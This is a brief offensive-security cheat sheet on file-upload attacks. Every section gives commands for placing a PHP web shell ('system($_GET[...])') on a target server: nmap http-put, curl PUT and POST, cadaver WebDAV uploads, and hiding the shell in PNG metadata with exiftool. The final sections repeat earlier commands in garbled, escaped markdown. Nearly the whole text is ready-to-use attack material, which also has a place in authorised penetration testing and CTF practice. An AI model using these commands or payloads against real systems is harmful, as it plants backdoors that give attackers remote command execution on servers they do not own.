# File Upload

**HTTP PUT**

```bash
nmap -p 80 192.168.1.103 --script http-put --script-args http-put.url='/dav/nmap.php',http-put.file='/root/Desktop/nmap.php'

curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
```

**Cadaver**

```
cadaver http://192.168.1.103/dav/
put /tmp/shell.php
```

**JPG to PNG shell**

```
<?php system($_GET['cmd']); ?>  //shell.php
exiftool "-comment<=shell.php" malicious.png
strings malicious.png | grep system
```

**Upload Files through POST**

```bash
# POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

# POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
```

## POST binary data to a web form

curl -F "field=\<shell.zip" [http://$TARGET/upld.php](http://$target/upld.php) -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v

PUTing File on the Webhost via PUT verb

curl -X PUT -d '\<?php system($\_GET\["c"]);?>' [http://192.168.2.99/shell.php](http://192.168.2.99/shell.php)
